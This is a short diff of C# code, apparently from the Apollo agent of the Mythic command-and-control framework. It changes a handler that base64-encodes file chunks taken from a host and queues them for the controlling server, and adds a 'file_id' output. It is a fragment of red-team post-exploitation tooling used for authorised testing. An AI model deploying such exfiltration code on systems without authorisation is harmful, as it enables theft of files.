@@ -244,18 +244,22 @@ namespace Apollo.Management.Files
         private void DownloadChunkSent(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
         {
             DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
-            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
-            {
-                TaskID = e.Chunks[0].TaskID,
-                Download = new DownloadMessage
-                {
-                    ChunkNumber = tracker.ChunksSent + 1,
-                    FileID = tracker.FileID,
-                    ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
-                    TaskID = e.Chunks[0].TaskID
-                },
-                ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
-            });
+            var msg = new MythicTaskResponse()
+                  {
+                      TaskID = e.Chunks[0].TaskID,
+                      Download = new DownloadMessage
+                      {
+                          ChunkNumber = tracker.ChunksSent + 1,
+                          FileID = tracker.FileID,
+                          ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
+                          TaskID = e.Chunks[0].TaskID
+                      },
+                      ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
+                  };
+            if(tracker.ChunksSent == 1){
+                msg.UserOutput = $"{{\"file_id\": \"{tracker.FileID}\"}}";
+            }
+            _agent.GetTaskManager().AddTaskResponseToQueue(msg);
         }
 
         public string GetScript()
